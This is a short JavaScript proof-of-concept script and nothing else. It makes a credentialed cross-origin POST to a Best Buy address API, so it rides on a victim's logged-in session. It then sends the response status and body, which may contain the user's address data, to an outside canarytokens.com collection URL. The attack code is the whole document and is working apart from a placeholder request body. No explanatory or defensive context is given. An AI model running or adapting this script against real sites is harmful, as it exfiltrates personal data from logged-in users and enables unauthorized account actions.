function sendAddressPoC() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://www.bestbuy.com/purchprefview/api/address", true);
  xhr.withCredentials = true;
  xhr.setRequestHeader("Content-Type", "application/json");

  xhr.onload = function () {
    var reportXhr = new XMLHttpRequest();
    reportXhr.open("POST", "http://canarytokens.com/about/terms/articles/paikxj9vn2mjww8p30yiee87p/post.jsp", true);
    reportXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    reportXhr.send("status=" + encodeURIComponent(xhr.status) + "&response=" + encodeURIComponent(xhr.responseText));
  };

  xhr.onerror = function () {
    var reportXhr = new XMLHttpRequest();
    reportXhr.open("POST", "http://canarytokens.com/about/terms/articles/paikxj9vn2mjww8p30yiee87p/post.jsp", true);
    reportXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    reportXhr.send("error=network_or_cors_error");
  };

  xhr.send(JSON.stringify({
    /* insert actual request body here */
  }));
}

sendAddressPoC();
